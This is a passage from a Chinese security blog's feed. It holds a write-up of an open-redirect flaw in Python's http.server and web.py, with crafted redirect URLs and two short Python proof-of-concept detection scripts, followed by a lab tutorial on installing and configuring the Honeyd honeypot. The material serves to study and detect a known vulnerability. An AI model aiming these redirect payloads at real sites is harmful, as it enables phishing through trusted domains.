class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语   句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure></li><li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p><ul><li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li><li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li><li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt></li></ul></li><li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p></li><li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt></p><p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt></p></li><li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p><p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt></p></li></ul><h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p><ul><li><p>简单的web.py代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt></p></li><li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p><p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt></p></li></ul><h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul><li><p>http.server——poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt></p></li><li><p>web.py——poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p><p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python-http-server-web-py-URL跳转漏洞实践&quot;&gt;&lt;a href=&quot;#python-http-server-web-py-URL跳转漏洞实践&quot; class=&quot;headerlink&quot; title=&quot;python: http.server / 
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="https://www.lsowl.top/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="URL跳转" scheme="https://www.lsowl.top/tags/URL%E8%B7%B3%E8%BD%AC/"/>
    
      <category term="WEB安全" scheme="https://www.lsowl.top/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
      <category term="python安全" scheme="https://www.lsowl.top/tags/python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用Honeyd搭建简易蜜罐</title>
    <link href="https://www.lsowl.top/2018/11/20/%E5%88%A9%E7%94%A8Honeyd%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E8%9C%9C%E7%BD%90/"/>
    <id>https://www.lsowl.top/2018/11/20/利用Honeyd搭建简易蜜罐/</id>
    <published>2018-11-20T13:51:25.000Z</published>
    <updated>2018-11-20T13:54:46.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一次实验课：利用honeyd搭建蜜罐"><a href="#一次实验课：利用honeyd搭建蜜罐" class="headerlink" title="一次实验课：利用honeyd搭建蜜罐"></a>一次实验课：利用honeyd搭建蜜罐</h2><h3 id="Honeyd相关依赖的安装"><a href="#Honeyd相关依赖的安装" class="headerlink" title="Honeyd相关依赖的安装"></a>Honeyd相关依赖的安装</h3><h4 id="安装g-gcc（对相关的一些依赖进行源码编译安装）"><a href="#安装g-gcc（对相关的一些依赖进行源码编译安装）" class="headerlink" title="安装g++ gcc（对相关的一些依赖进行源码编译安装）"></a>安装g++ gcc（对相关的一些依赖进行源码编译安装）</h4><p><code>sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542713989.95.png" alt></p><h4 id="安装Libevent-非同步事件通知的函数库"><a href="#安装Libevent-非同步事件通知的函数库" class="headerlink" title="安装Libevent(非同步事件通知的函数库)"></a>安装Libevent(非同步事件通知的函数库)</h4><p>通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714140.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714266.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714342.43.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714411.04.png" alt></p><h4 id="安装Libdnet-提供跨平台的网络相关的API函数库"><a href="#安装Libdnet-提供跨平台的网络相关的API函数库" class="headerlink" title="安装Libdnet(提供跨平台的网络相关的API函数库)"></a>安装Libdnet(提供跨平台的网络相关的API函数库)</h4><p>包括了ARP缓存，路由表查询，IP包及物理帧的传输</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714501.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714633.0.png" alt></p><h4 id="安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础"><a href="#安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础" class="headerlink" title="安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)"></a>安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libpcap-1.7.3.tar.gz</span><br><span class="line">sudo tar -zxvf libpcap-1.5.3.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">#在Ubuntu下缺少 flex  bison 手动安装</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716679.98.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716838.58.png" alt></p><h4 id="安装ARPD（运行在与Honeyd相同的系统上）"><a href="#安装ARPD（运行在与Honeyd相同的系统上）" class="headerlink" title="安装ARPD（运行在与Honeyd相同的系统上）"></a>安装ARPD（运行在与Honeyd相同的系统上）</h4><p>是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf arpd-0.2.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717043.1.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717136.12.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717261.85.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717343.56.png" alt></p><h4 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&apos;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717614.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717760.42.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717808.49.png" alt></p><h4 id="检测arpd和honeyd是否可以运行"><a href="#检测arpd和honeyd是否可以运行" class="headerlink" title="检测arpd和honeyd是否可以运行"></a>检测arpd和honeyd是否可以运行</h4><h5 id="arpd"><a href="#arpd" class="headerlink" title="arpd"></a>arpd</h5><h5 id><a href="#" class="headerlink" title></a><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717918.17.png" alt></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#运行后显示链接不存在</span><br><span class="line">#解决：</span><br><span class="line">whereis  libevent-1.4.so.2</span><br><span class="line">#将libevent-1.4.so.2位置添加到/etc/ld.so.conf</span><br><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line">#重新加载链接</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718321.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718381.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718352.41.png" alt></p><h5 id="honeyd"><a href="#honeyd" class="headerlink" title="honeyd"></a>honeyd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">honeyd</span><br><span class="line">#报错：无法加载libdnet</span><br><span class="line">#解决：也是无法链接，但是这个缺少链接文件：</span><br><span class="line">whereis libdnet</span><br><span class="line">#生成链接</span><br><span class="line">sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1</span><br><span class="line">#重新加载</span><br><span class="line">sudo /sbin/ldconfig</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718573.78.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718977.76.png" alt></p><h3 id="简单的调试与测试"><a href="#简单的调试与测试" class="headerlink" title="简单的调试与测试"></a>简单的调试与测试</h3><ul><li><p>arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71  </p><p><code>sudo arpd -i ens33 192.168.1.71</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719524.81.png" alt></p></li><li><p>将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo mv config.sample ./honeyd.conf</span><br><span class="line">sudo vim honeyd.conf</span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line">#设置系统重启时间</span><br><span class="line">set windows uptime 1728650</span><br><span class="line">#设置最大文件描述符</span><br><span class="line">set windows maxfds 35</span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">#开启22，23端口</span><br><span class="line">add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;</span><br><span class="line">add windows tcp port 23 proxy $ipsrc:23</span><br><span class="line">#add template udp port 53 proxy 141.211.92.141:53</span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line">#开启135，139端口</span><br><span class="line">add windows tcp port 135 open</span><br><span class="line">add windows tcp port 139 open</span><br><span class="line"></span><br><span class="line">bind 192.168.1.71 windows</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719973.36.png" alt></p></li><li><p>启动honeyd </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo honeyd -d -f honeyd.conf  -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720601.46.png" alt></p></li><li><p>在同网段下ping，访问web服务</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720665.52.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720690.71.png" alt></p></li><li><p>蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程）</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720889.75.png" alt></p></li><li><p>蜜罐主机应用的web服务显示的脚本内容</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542721041.24.png" alt></p></li></ul><h3 id="实验思考题"><a href="#实验思考题" class="headerlink" title="实验思考题"></a>实验思考题</h3><p>如何利用Honeyd实现跨网段的模拟。</p><p>回答：</p><ol><li>可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。</li><li>可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。</li></ol><h3 id="实验中的问题"><a href="#实验中的问题" class="headerlink" title="实验中的问题"></a>实验中的问题</h3><ol><li>对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex  bison ，需要手动安装。</li><li>安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）" target="_blank" rel="noopener">https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）</a></p><p><a href="https://blog.csdn.net/accepthjp/article/details/46399715" target="_blank" rel="noopener">https://blog.csdn.net/accepthjp/article/details/46399715</a></p><p><a href="https://blog.csdn.net/LFGxiaogang/article/details/73287152" target="_blank" rel="noopener">https://blog.csdn.net/LFGxiaogang/article/details/73287152</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一次实验课：利用honeyd搭建蜜罐&quot;&gt;&lt;a href=&quot;#一次实验课：利用honeyd搭建蜜罐&quot; class=&quot;headerlink&quot; title=&quot;一次实验课：利用honeyd搭建蜜罐&quot;&gt;&lt;/a&gt;一次实验课：利用honeyd搭建蜜罐&lt;/h2&gt;&lt;h3 id=&quot;H
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="https://www.lsowl.top/tags/Linux/"/>
    
      <category term="蜜罐" scheme="https://www.lsowl.top/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>URL跳转学习总结</title>
    <link href="https://www.lsowl.top/2018/11/12/URL%E8%B7%B3%E8%BD%AC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://www.lsowl.top/2018/11/12/URL跳转学习总结/</id>
    <published>2018-11-12T09:12:35.000Z</published>
    <updated>2019-11-08T14:34:27.377Z</updated>
    
